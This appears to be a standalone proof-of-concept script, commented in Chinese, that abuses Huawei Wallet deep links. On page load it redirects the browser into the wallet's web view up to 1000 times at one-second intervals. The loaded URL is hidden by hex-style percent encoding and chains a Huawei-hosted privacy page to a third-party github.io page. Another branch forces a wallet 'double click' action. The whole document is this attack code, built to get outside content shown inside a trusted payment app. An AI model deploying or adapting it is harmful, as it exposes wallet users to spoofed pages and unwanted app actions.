<script>
    // 定义跳转函数
    function redirect() {
        if (!window.walletAccountInfoJsInterface) {
            window.location.href = "https://wallet.cloud.huawei.com?biz=WalletCommon&action=commonH5&url=%68%74%74%70%73%3a%2f%2f%68%35%68%6f%73%74%69%6e%67%2d%64%72%63%6e%2e%64%62%61%6e%6b%63%64%6e%2e%63%6e%2f%63%63%68%35%2f%50%50%53%2f%73%73%70%2d%70%72%69%76%61%63%79%2d%75%72%6c%2f%69%6e%64%65%78%2e%68%74%6d%6c%3f%73%72%63%3d%68%74%74%70%73%3a%2f%2f%62%6f%67%75%31%32%31%33%38%2e%67%69%74%68%75%62%2e%69%6f%2f%50%61%67%65%73%2f%64%6f%75%62%6c%65%63%6c%69%63%6b%2e%68%74%6d%6c%26%74%69%74%6c%65%3d%31%31%31";
        } else {
            window.location.href = "https://wallet.cloud.huawei.com?action=action.com.huawei.hmos.wallet.DOUBLE_CLICK";
        }
    }

    // 设置执行次数和计数器
    const totalExecutions = 1000;
    let counter = 0;

    // 使用 setInterval 每隔一秒执行一次跳转
    const intervalId = setInterval(function() {
        redirect();
        counter++;

        // 当达到指定执行次数时，清除定时器
        if (counter >= totalExecutions) {
            clearInterval(intervalId);
        }
    }, 1000);
</script>
